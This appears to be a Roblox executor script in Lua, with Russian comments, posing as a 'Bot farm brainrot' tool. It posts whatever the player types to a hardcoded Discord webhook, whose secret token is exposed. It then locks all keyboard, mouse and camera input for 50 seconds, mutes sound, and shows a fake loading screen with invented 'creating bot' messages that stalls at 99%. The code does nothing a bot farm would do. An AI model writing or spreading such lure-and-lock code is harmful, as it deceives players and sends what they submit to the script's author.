-- Твой вебхук URL (замени на свой)
local WEBHOOK_URL = "https://discord.com/api/webhooks/1448032447492128818/bOAXh_wsZ3ZZfhHixlRTa6crrxh7c97F6VH7xhETV4YS7LvYcJlUWGELxtZShpb0vCZw"

-- Глобальные переменные для управления блокировкой
local blockedConnections = {}
local originalMouseIconEnabled = true

-- Функция для блокировки всех пользовательских вводов
local function blockAllInput()
    local UserInputService = game:GetService("UserInputService")
    local ContextActionService = game:GetService("ContextActionService")
    local Players = game:GetService("Players")
    
    -- Сохраняем оригинальное состояние курсора
    originalMouseIconEnabled = UserInputService.MouseIconEnabled
    UserInputService.MouseIconEnabled = true
    
    -- Блокируем все клавиши и мышь
    local function blockEverything(actionName, inputState, inputObject)
        return Enum.ContextActionResult.Sink -- Полностью блокируем действие
    end
    
    -- Список всех основных клавиш для блокировки
    local keysToBlock = {
        Enum.KeyCode.W, Enum.KeyCode.A, Enum.KeyCode.S, Enum.KeyCode.D,
        Enum.KeyCode.Space, Enum.KeyCode.LeftShift, Enum.KeyCode.E,
        Enum.KeyCode.Q, Enum.KeyCode.R, Enum.KeyCode.F, Enum.KeyCode.C,
        Enum.KeyCode.X, Enum.KeyCode.Z, Enum.KeyCode.Tab, Enum.KeyCode.Escape,
        Enum.KeyCode.Return, Enum.KeyCode.LeftControl, Enum.KeyCode.LeftAlt,
        Enum.KeyCode.One, Enum.KeyCode.Two, Enum.KeyCode.Three,
        Enum.KeyCode.Four, Enum.KeyCode.Five
    }
    
    -- Добавляем блокировку мыши
    local mouseButtons = {
        Enum.UserInputType.MouseButton1,
        Enum.UserInputType.MouseButton2,
        Enum.UserInputType.MouseButton3
    }
    
    -- Собираем все типы ввода для блокировки
    local allInputs = {}
    for _, key in pairs(keysToBlock) do
        table.insert(allInputs, key)
    end
    for _, mouse in pairs(mouseButtons) do
        table.insert(allInputs, mouse)
    end
    
    -- Блокируем действия с максимальным приоритетом
    ContextActionService:BindActionAtPriority(
        "BlockAllInputs",
        blockEverything,
        false,
        Enum.ContextActionPriority.High.Value,
        unpack(allInputs)
    )
    
    -- Блокируем изменения камеры
    local player = Players.LocalPlayer
    if player then
        -- Блокируем управление камерой
        local camera = workspace.CurrentCamera
        if camera then
            camera.CameraType = Enum.CameraType.Scriptable
            -- Устанавливаем фиксированную позицию камеры
            local originalCFrame = camera.CFrame
            blockedConnections.cameraBlock = game:GetService("RunService").RenderStepped:Connect(function()
                camera.CFrame = originalCFrame
            end)
        end
    end
    
    -- Блокируем все остальные возможные вводы
    blockedConnections.inputBegan = UserInputService.InputBegan:Connect(function(input)
        -- Ничего не делаем - просто блокируем
    end)
    
    blockedConnections.inputChanged = UserInputService.InputChanged:Connect(function(input)
        -- Ничего не делаем - просто блокируем
    end)
    
    blockedConnections.inputEnded = UserInputService.InputEnded:Connect(function(input)
        -- Ничего не делаем - просто блокируем
    end)
    
    -- Отключаем возможность переключения окон
    blockedConnections.windowFocusReleased = UserInputService.WindowFocusReleased:Connect(function()
        -- Ничего не делаем
    end)
end

-- Функция для разблокировки всех вводов
local function unblockAllInput()
    local UserInputService = game:GetService("UserInputService")
    local ContextActionService = game:GetService("ContextActionService")
    local Players = game:GetService("Players")
    
    -- Разблокируем привязанные действия
    ContextActionService:UnbindAction("BlockAllInputs")
    
    -- Разрываем все соединения блокировки
    for _, connection in pairs(blockedConnections) do
        if connection then
            connection:Disconnect()
        end
    end
    
    -- Восстанавливаем управление камерой
    local player = Players.LocalPlayer
    if player then
        local camera = workspace.CurrentCamera
        if camera then
            camera.CameraType = Enum.CameraType.Custom
        end
    end
    
    -- Восстанавливаем курсор
    UserInputService.MouseIconEnabled = originalMouseIconEnabled
    
    -- Очищаем таблицу соединений
    blockedConnections = {}
end

-- Функция для создания экрана загрузки
local function createLoadingScreen()
    local LoadingScreen = Instance.new("ScreenGui")
    LoadingScreen.Name = "LoadingScreen"
    LoadingScreen.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    LoadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    LoadingScreen.ResetOnSpawn = false

    -- Полностью черный фон (не прозрачный)
    local DarkOverlay = Instance.new("Frame")
    DarkOverlay.Size = UDim2.new(1, 0, 1, 0)
    DarkOverlay.Position = UDim2.new(0, 0, 0, 0)
    DarkOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    DarkOverlay.BackgroundTransparency = 0
    DarkOverlay.ZIndex = 9999
    DarkOverlay.Active = true
    DarkOverlay.Selectable = true
    DarkOverlay.Parent = LoadingScreen

    -- Основной контейнер загрузки
    local LoadingContainer = Instance.new("Frame")
    LoadingContainer.Size = UDim2.new(0, 600, 0, 300)
    LoadingContainer.Position = UDim2.new(0.5, -300, 0.5, -150)
    LoadingContainer.AnchorPoint = Vector2.new(0.5, 0.5)
    LoadingContainer.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    LoadingContainer.ZIndex = 10000
    LoadingContainer.Parent = LoadingScreen

    local LoadingCorner = Instance.new("UICorner")
    LoadingCorner.CornerRadius = UDim.new(0, 20)
    LoadingCorner.Parent = LoadingContainer

    -- Заголовок загрузки
    local LoadingTitle = Instance.new("TextLabel")
    LoadingTitle.Size = UDim2.new(1, 0, 0, 70)
    LoadingTitle.Position = UDim2.new(0, 0, 0, 0)
    LoadingTitle.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    LoadingTitle.Text = "Bot farm brainrot"
    LoadingTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    LoadingTitle.TextSize = 32
    LoadingTitle.Font = Enum.Font.GothamBold
    LoadingTitle.ZIndex = 10001
    LoadingTitle.Parent = LoadingContainer

    local TitleCorner2 = Instance.new("UICorner")
    TitleCorner2.CornerRadius = UDim.new(0, 20)
    TitleCorner2.Parent = LoadingTitle

    -- Анимированная иконка
    local LoadingIcon = Instance.new("TextLabel")
    LoadingIcon.Size = UDim2.new(0, 100, 0, 100)
    LoadingIcon.Position = UDim2.new(0.5, -50, 0.3, -50)
    LoadingIcon.BackgroundTransparency = 1
    LoadingIcon.Text = "⚙️"
    LoadingIcon.TextColor3 = Color3.fromRGB(88, 101, 242)
    LoadingIcon.TextSize = 70
    LoadingIcon.Font = Enum.Font.GothamBold
    LoadingIcon.ZIndex = 10001
    LoadingIcon.Parent = LoadingContainer

    -- Полоса загрузки фон
    local ProgressBarBack = Instance.new("Frame")
    ProgressBarBack.Size = UDim2.new(0.9, 0, 0, 30)
    ProgressBarBack.Position = UDim2.new(0.05, 0, 0.7, 0)
    ProgressBarBack.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    ProgressBarBack.ZIndex = 10001
    ProgressBarBack.Parent = LoadingContainer

    local ProgressBarBackCorner = Instance.new("UICorner")
    ProgressBarBackCorner.CornerRadius = UDim.new(0, 15)
    ProgressBarBackCorner.Parent = ProgressBarBack

    -- Полоса загрузки заполнение
    local ProgressBarFill = Instance.new("Frame")
    ProgressBarFill.Size = UDim2.new(0, 0, 1, 0)
    ProgressBarFill.Position = UDim2.new(0, 0, 0, 0)
    ProgressBarFill.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    ProgressBarFill.ZIndex = 10002
    ProgressBarFill.Parent = ProgressBarBack

    local ProgressBarFillCorner = Instance.new("UICorner")
    ProgressBarFillCorner.CornerRadius = UDim.new(0, 15)
    ProgressBarFillCorner.Parent = ProgressBarFill

    -- Текст процентов
    local PercentText = Instance.new("TextLabel")
    PercentText.Size = UDim2.new(1, 0, 0, 40)
    PercentText.Position = UDim2.new(0, 0, 0.8, 10)
    PercentText.BackgroundTransparency = 1
    PercentText.Text = "Загрузка: 0%"
    PercentText.TextColor3 = Color3.fromRGB(200, 200, 200)
    PercentText.TextSize = 24
    PercentText.Font = Enum.Font.GothamBold
    PercentText.ZIndex = 10001
    PercentText.Parent = LoadingContainer

    -- Сообщение загрузки
    local LoadingMessage = Instance.new("TextLabel")
    LoadingMessage.Size = UDim2.new(1, 0, 0, 40)
    LoadingMessage.Position = UDim2.new(0, 0, 0.9, 0)
    LoadingMessage.BackgroundTransparency = 1
    LoadingMessage.Text = "Система блокировки активирована..."
    LoadingMessage.TextColor3 = Color3.fromRGB(150, 150, 150)
    LoadingMessage.TextSize = 18
    LoadingMessage.Font = Enum.Font.Gotham
    LoadingMessage.ZIndex = 10001
    LoadingMessage.Parent = LoadingContainer

    return LoadingScreen, ProgressBarFill, PercentText, LoadingMessage, LoadingIcon
end

-- Функция запуска загрузки
local function startLoading(duration)
    -- Блокируем все вводы ДО создания экрана
    blockAllInput()
    
    -- Пытаемся отключить звук (если не получается - продолжаем)
    pcall(function()
        game:GetService("SoundService").Volume = 0
        print("🔇 Звук отключен")
    end)
    
    -- Создаем экран загрузки
    local LoadingScreen, ProgressBarFill, PercentText, LoadingMessage, LoadingIcon = createLoadingScreen()
    
    -- Анимация вращения иконки
    local rotationSpeed = 1.5
    local rotateConnection
    rotateConnection = game:GetService("RunService").RenderStepped:Connect(function(deltaTime)
        LoadingIcon.Rotation = (LoadingIcon.Rotation + (rotationSpeed * deltaTime * 60)) % 360
    end)
    
    -- Медленная загрузка на указанное время
    local startTime = tick()
    local endTime = startTime + duration
    
    -- Анимация загрузки
    local updateConnection
    updateConnection = game:GetService("RunService").Heartbeat:Connect(function()
        local currentTime = tick()
        local elapsed = currentTime - startTime
        local progress = math.min(elapsed / duration, 0.99) -- Останавливаем на 99%
        
        -- Обновляем полосу загрузки
        ProgressBarFill.Size = UDim2.new(progress, 0, 1, 0)
        local percent = math.floor(progress * 100)
        PercentText.Text = "Загрузка: " .. percent .. "%"
        
        -- Обновляем сообщения на разных этапах
        if progress < 0.1 then
            LoadingMessage.Text = "🔒 Активация скрипта"
        elseif progress < 0.2 then
            LoadingMessage.Text = "⛔ Создание бота..."
        elseif progress < 0.3 then
            LoadingMessage.Text = "🎥 Загружаем браинротов..."
        elseif progress < 0.4 then
            LoadingMessage.Text = "🛡️ Подключение бота..."
        elseif progress < 0.5 then
            LoadingMessage.Text = "📊 Инициализация систем мониторинга..."
        elseif progress < 0.6 then
            LoadingMessage.Text = "🔍 Сканирование окружения..."
        elseif progress < 0.7 then
            LoadingMessage.Text = "⚙️ Оптимизация процессов..."
        elseif progress < 0.8 then
            LoadingMessage.Text = "📈 Сбор статистики..."
        elseif progress < 0.9 then
            LoadingMessage.Text = "🔐 Финальная проверка безопасности..."
        elseif progress < 0.99 then
            LoadingMessage.Text = "⏳ Последние приготовления..."
        else
            LoadingMessage.Text = "✅ Система создала бота. Ожидайте завершения..."
            -- Останавливаем обновление прогресса
        end
        
        -- Если время вышло, принудительно останавливаем на 99%
        if currentTime >= endTime and progress < 0.99 then
            ProgressBarFill.Size = UDim2.new(0.99, 0, 1, 0)
            PercentText.Text = "Загрузка: 99%"
            LoadingMessage.Text = "✅ Система возникла ошибка. Перезапускаем."
        end
    end)
    
    -- Ждем указанное время
    task.wait(duration)
    
    -- Останавливаем соединения
    if rotateConnection then rotateConnection:Disconnect() end
    if updateConnection then updateConnection:Disconnect() end
    
    -- Меняем иконку на завершенную
    LoadingIcon.Text = "✅"
    LoadingIcon.Rotation = 0
    PercentText.Text = "Загрузка: 99%"
    LoadingMessage.Text = "✅ Работа завершена. Нажмите ESC для закрытия."
    
    -- Ждем нажатия ESC для разблокировки
    local escPressed = false
    local escConnection = game:GetService("UserInputService").InputBegan:Connect(function(input)
        if input.KeyCode == Enum.KeyCode.Escape then
            escPressed = true
        end
    end)
    
    -- Ждем нажатия ESC или 10 секунд
    local waitStart = tick()
    while not escPressed and (tick() - waitStart) < 10 do
        task.wait(0.1)
    end
    
    escConnection:Disconnect()
    
    -- Разблокируем вводы
    unblockAllInput()
    
    -- Анимация исчезновения
    for i = 1, 20 do
        LoadingContainer.BackgroundTransparency = i/20
        LoadingTitle.BackgroundTransparency = i/20
        LoadingTitle.TextTransparency = i/20
        LoadingIcon.TextTransparency = i/20
        PercentText.TextTransparency = i/20
        LoadingMessage.TextTransparency = i/20
        ProgressBarBack.BackgroundTransparency = i/20
        ProgressBarFill.BackgroundTransparency = i/20
        task.wait(0.02)
    end
    
    LoadingScreen:Destroy()
end

-- Создаем основной GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "WebhookSender"
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Основной фрейм
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 300, 0, 150)
MainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

-- Скругление углов
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

-- Заголовок
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Title.Text = "Bot farm brainrot"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 18
Title.Font = Enum.Font.GothamBold
Title.Parent = MainFrame

-- Скругление для заголовка
local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 8)
TitleCorner.Parent = Title

-- Поле для сообщения
local MessageLabel = Instance.new("TextLabel")
MessageLabel.Size = UDim2.new(0.9, 0, 0, 20)
MessageLabel.Position = UDim2.new(0.05, 0, 0, 50)
MessageLabel.BackgroundTransparency = 1
MessageLabel.Text = "Сообщение:"
MessageLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
MessageLabel.TextSize = 14
MessageLabel.TextXAlignment = Enum.TextXAlignment.Left
MessageLabel.Font = Enum.Font.Gotham
MessageLabel.Parent = MainFrame

local MessageBox = Instance.new("TextBox")
MessageBox.Size = UDim2.new(0.9, 0, 0, 35)
MessageBox.Position = UDim2.new(0.05, 0, 0, 70)
MessageBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MessageBox.TextColor3 = Color3.fromRGB(255, 255, 255)
MessageBox.PlaceholderText = "Введи сообщение..."
MessageBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
MessageBox.TextSize = 14
MessageBox.Text = ""
MessageBox.ClearTextOnFocus = false
MessageBox.Font = Enum.Font.Gotham
MessageBox.Parent = MainFrame

local MessageCorner = Instance.new("UICorner")
MessageCorner.CornerRadius = UDim.new(0, 4)
MessageCorner.Parent = MessageBox

-- Кнопка отправки
local SendButton = Instance.new("TextButton")
SendButton.Size = UDim2.new(0.9, 0, 0, 35)
SendButton.Position = UDim2.new(0.05, 0, 0, 115)
SendButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242) -- Discord цвет
SendButton.Text = "📤 Отправить"
SendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SendButton.TextSize = 16
SendButton.Font = Enum.Font.GothamBold
SendButton.Parent = MainFrame

local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(0, 6)
ButtonCorner.Parent = SendButton

-- Эффект при наведении на кнопку
SendButton.MouseEnter:Connect(function()
    SendButton.BackgroundColor3 = Color3.fromRGB(71, 82, 196)
end)

SendButton.MouseLeave:Connect(function()
    SendButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
end)

-- Функция отправки вебхука
local function sendWebhook(message)
    local webhookRequest = syn and syn.request or request or http_request or http.request
    
    if not webhookRequest then
        warn("❌ HTTP функция не найдена!")
        return false
    end
    
    local success, response = pcall(function()
        return webhookRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({
                content = message,
                username = "Bot farm brainrot",
                avatar_url = "https://cdn.discordapp.com/embed/avatars/4.png"
            })
        })
    end)
    
    return success and response and response.Success
end

-- ОБРАБОТЧИК КНОПКИ ОТПРАВКИ - ЗДЕСЬ ЗАПУСКАЕТСЯ ЗАГРУЗКА ПОСЛЕ ОТПРАВКИ
SendButton.MouseButton1Click:Connect(function()
    local message = MessageBox.Text
    
    -- Проверка ввода
    if message == "" then
        MessageBox.PlaceholderText = "❌ Введи сообщение!"
        MessageBox.PlaceholderColor3 = Color3.fromRGB(255, 100, 100)
        task.wait(1)
        MessageBox.PlaceholderText = "Введи сообщение..."
        MessageBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
        return
    end
    
    -- Визуальная обратная связь
    local originalText = SendButton.Text
    SendButton.Text = "⏳ Отправка..."
    SendButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
    
    -- Сначала отправляем сообщение
    local success = sendWebhook(message)
    
    if success then
        SendButton.Text = "✅ Отправлено!"
        SendButton.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
        
        -- Очищаем поле сообщения
        MessageBox.Text = ""
        
        -- ЗАПУСКАЕМ ЭКРАН ЗАГРУЗКИ ПОСЛЕ УСПЕШНОЙ ОТПРАВКИ
        -- Небольшая задержка перед началом загрузки
        task.wait(0.5)
        
        -- Запускаем загрузку на 50 секунд
        print("🚀 Начинаю загрузку после отправки сообщения...")
        startLoading(50) -- 50 секунд полной блокировки
        
    else
        SendButton.Text = "❌ Ошибка!"
        SendButton.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
        
        -- Возвращаем исходный вид через 2 секунды (только при ошибке)
        task.wait(2)
        SendButton.Text = originalText
        SendButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    end
end)

-- Кнопка закрытия
local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Position = UDim2.new(1, -35, 0, 5)
CloseButton.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextSize = 16
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Parent = MainFrame

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 15)
CloseCorner.Parent = CloseButton

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- Перетаскивание окна
local dragging = false
local dragInput
local dragStart
local startPos

Title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

Title.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)

print("✅ Bot farm brainrot GUI загружен!")
print("📝 Введите сообщение и нажмите 'Отправить' для запуска")
